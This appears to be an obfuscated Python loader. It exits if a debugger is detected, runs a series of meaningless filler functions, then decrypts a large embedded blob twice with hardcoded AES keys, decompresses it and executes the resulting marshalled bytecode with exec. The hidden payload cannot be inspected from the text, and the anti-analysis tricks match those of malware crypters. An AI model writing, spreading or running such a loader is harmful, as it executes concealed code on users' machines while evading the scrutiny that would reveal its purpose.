
import sys
import base64
import zlib
import marshal
import random
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# ---- ANTI-DEBUG ----
if sys.gettrace() is not None:
    sys.exit(0)

# ---- DUMMY JUNK CODE ----

def zaqlv():
    xwuk = [i**2 for i in range(100) if i % 2 == 0]
    for _x in range(10):
        _y = _x * 3.14
    return xwuk
zaqlv()


def zqorw():
    mvxr = [i**2 for i in range(100) if i % 2 == 0]
    for _x in range(10):
        _y = _x * 3.14
    return mvxr
zqorw()


def zcodx():
    gkgh = [i**2 for i in range(100) if i % 2 == 0]
    for _x in range(10):
        _y = _x * 3.14
    return gkgh
zcodx()


def mkuey():
    pwig = [i**2 for i in range(100) if i % 2 == 0]
    for _x in range(10):
        _y = _x * 3.14
    return pwig
mkuey()


def jtkju():
    bvlj = [i**2 for i in range(100) if i % 2 == 0]
    for _x in range(10):
        _y = _x * 3.14
    return bvlj
jtkju()


def dqezq():
    ssgj = [i**2 for i in range(100) if i % 2 == 0]
    for _x in range(10):
        _y = _x * 3.14
    return ssgj
dqezq()


def sncne():
    nlfs = [i**2 for i in range(100) if i % 2 == 0]
    for _x in range(10):
        _y = _x * 3.14
    return nlfs
sncne()


def isawn():
    gboh = [i**2 for i in range(100) if i % 2 == 0]
    for _x in range(10):
        _y = _x * 3.14
    return gboh
isawn()


def mvptu():
    tzdv = [i**2 for i in range(100) if i % 2 == 0]
    for _x in range(10):
        _y = _x * 3.14
    return tzdv
mvptu()


def rqwex():
    zypi = [i**2 for i in range(100) if i % 2 == 0]
    for _x in range(10):
        _y = _x * 3.14
    return zypi
rqwex()


def ubuvm():
    maiw = [i**2 for i in range(100) if i % 2 == 0]
    for _x in range(10):
        _y = _x * 3.14
    return maiw
ubuvm()


def hlewr():
    vvsg = [i**2 for i in range(100) if i % 2 == 0]
    for _x in range(10):
        _y = _x * 3.14
    return vvsg
hlewr()


def pmysw():
    uwfp = [i**2 for i in range(100) if i % 2 == 0]
    for _x in range(10):
        _y = _x * 3.14
    return uwfp
pmysw()


def pzmoy():
    tpwm = [i**2 for i in range(100) if i % 2 == 0]
    for _x in range(10):
        _y = _x * 3.14
    return tpwm
pzmoy()


def sorgl():
    vvee = [i**2 for i in range(100) if i % 2 == 0]
    for _x in range(10):
        _y = _x * 3.14
    return vvee
sorgl()


# ---- KEYS & IV ----
_KEY1 = b'\x02\x9ex|KmC\x8e\xf6\xa3bC\xe7\xdc\x81\xd5w\xc0\xb0\xdb=\x04\x1b\xc9\x8c\xefj\x08Gx6-'
_IV1 = b'\xd1\xfa\x93\xc6c(\xf7`\x02C\xbcO]+\xcfz'
_KEY2 = b'\xa3L\xfc\x8d#\x8c\x08\xfdi\xe0\x95\xcf$\x90\xba\xf8z\xd6Dz\x19Z\xac\xca\xaa{\xcc\x18\xfc\x12\xf8\xb5'
_IV2 = b'\x0e\xf6\xcc\x9f][@\xf3\xe8\x9bC\xcb%6\x0c\n'

def double_decrypt(enc_data):
    cipher2 = AES.new(_KEY2, AES.MODE_CBC, _IV2)
    dec2 = unpad(cipher2.decrypt(enc_data), 16)
    cipher1 = AES.new(_KEY1, AES.MODE_CBC, _IV1)
    dec1 = unpad(cipher1.decrypt(dec2), 16)
    return dec1

# ---- PAYLOAD ----
_enc = base64.b64decode('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')
compressed = double_decrypt(_enc)
bytecode = zlib.decompress(compressed)

exec(
    marshal.loads(bytecode),
    {"__name__": "__main__", "__builtins__": __builtins__}
)
